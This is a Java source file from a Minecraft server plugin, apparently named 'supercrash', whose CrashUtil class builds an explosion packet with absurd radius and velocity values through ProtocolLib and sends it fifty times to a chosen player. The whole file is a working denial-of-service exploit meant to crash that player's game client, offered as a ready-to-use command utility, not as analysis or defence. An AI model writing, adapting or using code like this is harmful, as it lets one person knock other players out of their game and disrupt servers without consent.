package org.sct.supercrash.commands.util;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.wrappers.BlockPosition;
import com.google.common.collect.Lists;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;
import java.util.List;

/**
 * @author icestar
 * @date 2020/2/13 10:34
 */

public class CrashUtil {
    public static boolean crash(Player player) {
        ProtocolManager manager = ProtocolLibrary.getProtocolManager();
        PacketContainer packet = manager.createPacket(PacketType.Play.Server.EXPLOSION);

        double x = player.getLocation().getX();
        double y = player.getLocation().getY();
        double z = player.getLocation().getZ();

        packet.getDoubles().write(0, x);
        packet.getDoubles().write(1, y);
        packet.getDoubles().write(2, z);

        packet.getFloat().write(0, (float) 1000000000);
        List<BlockPosition> list = Lists.newArrayList();
        packet.getBlockPositionCollectionModifier().write(0, list);
        packet.getFloat().write(0, (float) 0);
        packet.getFloat().write(1, (float) 1000000000);
        packet.getFloat().write(2, (float) 0);

        try {
            for (int i = 0; i < 50; i++) {
                manager.sendServerPacket(player, packet);
            }
        } catch (InvocationTargetException e) {
            return false;
        }
        return true;
    }
}
